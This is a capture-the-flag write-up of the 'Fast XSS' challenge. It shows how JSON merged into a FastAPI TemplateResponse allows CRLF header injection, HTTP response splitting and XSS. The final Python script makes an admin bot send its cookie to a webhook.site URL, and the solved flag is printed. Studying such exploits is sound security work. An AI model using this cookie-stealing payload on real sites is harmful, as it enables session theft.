## Fast XSS  

<img src="images/chall.png" width=600>

The challenge setup consists of a Node.js server on port `1337` and a FastAPI server on port `8000`.  

<img src="images/ports.png" width=600>

The Node.js server has an `/api/report` endpoint that gets an admin bot with the flag cookie to visit the FastAPI server.  

```js
// index.mjs
app.post("/api/report", async (req, res) => {
  const { path } = req.body;
  try {
    await visit(path);
    return res.sendStatus(200);
  } catch (e) {
    console.error(e);
    return res.status(500).send("Something wrong");
  }
});

// bot.mjs
import puppeteer from "puppeteer";

const FLAG = process.env.FLAG ?? "DH{FLAG}"

const APP_HOST = "web";
const APP_PORT = "8000";
export const APP_URL = `http://${APP_HOST}:${APP_PORT}/`;

const sleep = async (msec) =>
  new Promise((resolve) => setTimeout(resolve, msec));

export const visit = async (path) => {
  console.log(`start: ${path}`);

  const browser = await puppeteer.launch({
    headless: false,
    executablePath: "/usr/bin/google-chrome-stable",
    args: ["--no-sandbox"],
  });

  const context = await browser.createIncognitoBrowserContext();

  try {
    const page = await context.newPage();
    await page.setCookie({
      name: "FLAG",
      value: FLAG,
      domain: APP_HOST,
      path: "/",
    });
    await page.goto(APP_URL + path);
    await sleep(5 * 1000);
    await page.close();
  } catch (e) {
    console.error(e);
  }

  await context.close();
  await browser.close();

  console.log(`end: ${path}`);
};
```

This means that the XSS vuln is on the FastAPI server.  

Looking at the source code, we can see that we are allowed to pass in a JSON dictionary, which the backend will merge into the `TemplateResponse` context.  

```python
from fastapi import FastAPI, Request, Response
from fastapi.templating import Jinja2Templates
import json

app = FastAPI()
templates = Jinja2Templates(directory="templates")

@app.get("/")
async def index(request: Request, data: str = '{"context": {"user": "Guest"}}'):
    try:
        data = json.loads(data)
    except:
        data = {"context": {"user": "Guest"}}
    context = {"name": "index.html", "request": request}|data
    return templates.TemplateResponse(**context)
```

The Jinja template for the main page renders `user` without the `|safe` filter, so we can't directly inject any XSS payload there.  

```html
Hello {{ user }} !
```

In the `fastapi.templating` library source code, we can see that we can actually control the headers of the response.  

```python
@overload
    def TemplateResponse(
        self,
        request: Request,
        name: str,
        context: dict[str, Any] | None = None,
        status_code: int = 200,
        headers: Mapping[str, str] | None = None,
        media_type: str | None = None,
        background: BackgroundTask | None = None,
    ) -> _TemplateResponse: ...
```

We can overwrite the `headers` parameter and perform a HTTP response splitting attack, making the server render the XSS payload instead of the default template.  

```python
payload = {
    "context": {"user": "a"},
    "headers": {
        f"a\r\nContent-Type: text/html\r\n\r\n<script>alert(1)</script>": "a"
    }
}

payload = quote(json.dumps(payload))

print(payload)
```

<img src="images/xss.png" width=600>

Now that we have a way of gaining XSS on the server, we just need to make a `POST` request to `/api/report` with an XSS payload that exfiltrates the flag cookie to our webhook.  

```python
import requests
from urllib.parse import quote
import json

url = "http://host3.dreamhack.games:16467/"

xss = '<script>location.href=`https://webhook.site/6785156f-3542-4773-a7c3-29ff987fdc40/${document.cookie}`</script>'

payload = {
    "context": {"user": "a"},
    "headers": {
        f"a\r\nContent-Type: text/html\r\n\r\n{xss}": "a"
    }
}

payload = quote(json.dumps(payload))

res = requests.post(f'{url}/api/report', json={
    'path': f'?data={payload}'
})

print(res.text)
```

Flag: `DH{7a709e7d846af26c41613cbcf071cd8a5996150a60507007c129a092f720057c}`